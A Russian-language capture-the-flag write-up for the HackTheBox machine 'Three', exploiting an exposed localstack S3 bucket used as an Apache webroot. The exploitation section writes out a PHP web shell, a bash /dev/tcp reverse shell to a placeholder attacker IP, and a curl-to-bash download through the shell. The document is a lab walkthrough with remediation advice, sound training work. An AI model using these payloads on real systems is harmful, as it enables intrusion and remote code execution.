# Starting Point: Three (Easy)

## Задача

Machine: Three (HackTheBox Starting Point)
Difficulty: Easy
OS: Linux
Focus: Cloud misconfiguration (AWS S3 / localstack), virtual hosting, PHP web shell, reverse shell

Цель — получить user-flag через эксплуатацию небезопасно сконфигурированного S3-совместимого хранилища (localstack), используемого как webroot веб-сервера Apache.

**Внимание:** все флаги, хеши и IP-адреса в этом write-up заменены на нереальные значения перед публикацией (репозиторий публичный).

## Recon

### Сканирование портов

```
nmap -sC -sV -A -p- <TARGET_IP>
```

Результат:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Открыто всего два порта — SSH (22, без валидных credentials на этом этапе не атакуем) и HTTP (80). Основной вектор — веб-сервис.

### Веб-энумерация

На главной странице (Apache, "The Toppers" — сайт музыкальной группы) обнаружен email `mail@thetoppers.htb`, подтверждающий домен `thetoppers.htb`. Добавляем запись в `/etc/hosts`:

```
echo "<TARGET_IP> thetoppers.htb" | sudo tee -a /etc/hosts
```

Сайт представляет собой статичную одностраничную визитку на базе PHP (`/index.php`, форма Contact отправляет запрос на `/action_page.php`). Явных зацепок на дополнительные поддомены в HTML не найдено.

### Vhost-энумерация

Поскольку сервер использует host-based routing (virtual hosting), проведена энумерация поддоменов через подмену заголовка `Host`:

```
gobuster vhost -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://thetoppers.htb --append-domain
```

**Важный нюанс:** флаг `--append-domain` обязателен для gobuster v3.2.0+, иначе инструмент подставляет слово из словаря "как есть" (без домена), что приводит к сплошным `400 Bad Request` и полностью бесполезному результату. В ходе работы это стало источником продолжительной путаницы: без этого флага, а также при попытках через `ffuf`/`wfuzz` вручную с некорректно измеренным baseline-размером ответа, найти рабочий поддомен не удавалось.

Результат:

```
Found: s3.thetoppers.htb Status: 404 [Size: 21]
```

Добавляем в `/etc/hosts`:

```
echo "<TARGET_IP> s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

Запрос к найденному поддомену:

```
curl -s http://s3.thetoppers.htb
# {"status":"running"}
```

Короткий JSON-ответ `{"status":"running"}` — характерный признак **localstack**, локальной эмуляции AWS-сервисов (в данном случае S3), используемой обычно для тестирования cloud-native приложений без обращения к реальному AWS.

## Vulnerability / Misconfig

Root cause — не единичная ошибка, а цепочка архитектурных решений:

1. **Localstack (dev/test-инструмент) развёрнут без сетевой изоляции** от production-сегмента и доступен по тому же домену (`*.thetoppers.htb`), что и публичный сайт, вместо того чтобы находиться в приватной сети (VPC) без публичного DNS-имени, доступной только изнутри инфраструктуры разработки или через VPN/bastion host.
2. **Отсутствует проверка авторизации (anonymous access)** — S3 API отвечает на запросы с произвольными, даже заведомо фиктивными access key / secret key. Аутентификация AWS SigV4 фактически не проверяется.
3. **Избыточные права доступа на бакет** — анонимному клиенту разрешена не только операция чтения (`ListBucket`, `GetObject`), но и **запись** (`PutObject`), что нарушает принцип наименьших привилегий (least privilege).
4. **Бакет используется как webroot Apache** — файлы внутри S3-бакета `thetoppers.htb` (`index.php`, `.htaccess`, `images/`) — это те же файлы, что раздаёт веб-сервер на порту 80. Любой файл, загруженный в бакет, немедленно становится исполняемым PHP-кодом на сайте.

Совокупность этих четырёх факторов превращает "просто доступный дев-инструмент" в прямой путь к Remote Code Execution.

## Exploitation

### 1. Установка и настройка awscli

```
sudo apt install awscli
aws configure
# AWS Access Key ID: temp
# AWS Secret Access Key: temp
# Default region name: temp
# Default output format: temp
```

Значения полей произвольные — сервер (localstack, без проверки авторизации) их не валидирует, но клиент aws cli требует непустой конфиг для формирования запросов.

### 2. Энумерация бакетов

```
aws --endpoint=http://s3.thetoppers.htb s3 ls
# 2026-08-25 07:48:50 thetoppers.htb

aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
# index.php
# .htaccess
# images/
```

Подтверждено: содержимое бакета совпадает с webroot сайта.

### 3. Загрузка веб-шелла

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

Проверка выполнения кода:

```
curl "http://thetoppers.htb/shell.php?cmd=id"
```

### 4. Reverse shell

Подготовлен bash-скрипт реверс-шелла:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/1337 0>&1
```

Запущен листener и локальный HTTP-сервер для доставки payload:

```
nc -nvlp 1337
python3 -m http.server 8000
```

Триггер загрузки и выполнения через веб-шелл:

```
curl "http://thetoppers.htb/shell.php?cmd=curl%20<ATTACKER_IP>:8000/shell.sh|bash"
```

Получен интерактивный shell от имени `www-data`:

```
www-data@three:/var/www/html$ cat /var/www/flag.txt
REDACTED_FLAG_a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
```

**Примечание:** privesc до root не потребовался — флаг доступен на уровне пользователя `www-data`, поскольку сервисный аккаунт веб-сервера уже имеет доступ на чтение файла флага.

## Remediation

- **Сетевая изоляция dev/test-инструментов.** Localstack и подобные эмуляторы облачных сервисов должны разворачиваться в приватной сети (VPC) без публичного DNS-имени и публичного IP, с доступом только из внутренней сети разработки или через VPN/bastion host — не на одном домене и не в одном сетевом периметре с production-сервисами.
- **Обязательная аутентификация даже для dev-окружений.** Не полагаться на "security through obscurity" — включать проверку авторизации (даже базовую) в любом сервисе, доступном за пределами localhost, независимо от того, что это "просто тестовый инструмент".
- **Least privilege для S3-политик.** Анонимный или сервисный доступ к бакетам должен ограничиваться минимально необходимым набором операций (как правило, только чтение для статических ассетов); запись должна быть доступна только авторизованным CI/CD-процессам или конкретным ролям.
- **Разделение хранилища от исполняемого кода.** Если S3 используется как источник статического контента, каталог, доступный на запись, не должен совпадать с директорией, которую веб-сервер исполняет как код (PHP/CGI). Отделение "storage" от "webroot" убирает саму возможность RCE даже при компрометации бакета.
- **Мониторинг аномальных PUT-запросов к S3/облачным хранилищам** — в реальной инфраструктуре SOC должен отслеживать неожиданные операции записи в бакеты, особенно с новыми/нетипичными именами объектов (`shell.php`, `*.php` в бакете, который исторически содержит только статические файлы).

## Lessons learned

- **Cloud misconfiguration — самостоятельный класс уязвимостей**, не сводящийся к "плохому паролю". Здесь root cause — архитектурное решение (совместное размещение dev-инструмента и prod-инфраструктуры), а не одна конкретная ошибка конфигурации.
- **Vhost-энумерация — не всегда "перебор наугад".** Общие словари (top-1M subdomains) не содержат специфичных, контекстных имён вроде `s3`, если они не являются общепринятыми в вебе. В условиях лабы/задания стоит в первую очередь смотреть на прямые подсказки в описании и в контенте самого сайта (JS, формы, комментарии в HTML) — грубый перебор является резервным, а не первым методом.
- **Флаги инструментов имеют значение и часто меняются между версиями.** Пропущенный `--append-domain` у gobuster (обязателен начиная с v3.2.0) превращает результат в бесполезный шум (`400 Bad Request` на все запросы). Аналогично, при использовании `ffuf`/`wfuzz` вручную критично **точно** измерить baseline (дефолтный ответ сервера для несуществующего vhost), не перепутав его с ответом от главной страницы сайта — ошибка в этом одном числе полностью ломает логику фильтрации и может увести recon в сторону на десятки минут.
- **Инструмент с автоматической калибровкой (gobuster vhost) снижает риск ручной ошибки**, но также скрывает часть механики от пользователя. Понимание того, что происходит "под капотом" (baseline detection, Host header injection), остаётся необходимым даже при использовании удобных инструментов — иначе невозможно продиагностировать, почему инструмент не находит ожидаемый результат.
- **AWS CLI — универсальный инструмент не только для настоящего AWS**, но и для любого S3-совместимого API (localstack, MinIO, Ceph RGW и др.) через флаг `--endpoint`. Полезный навык для DevSecOps и cloud security задач за пределами CTF.
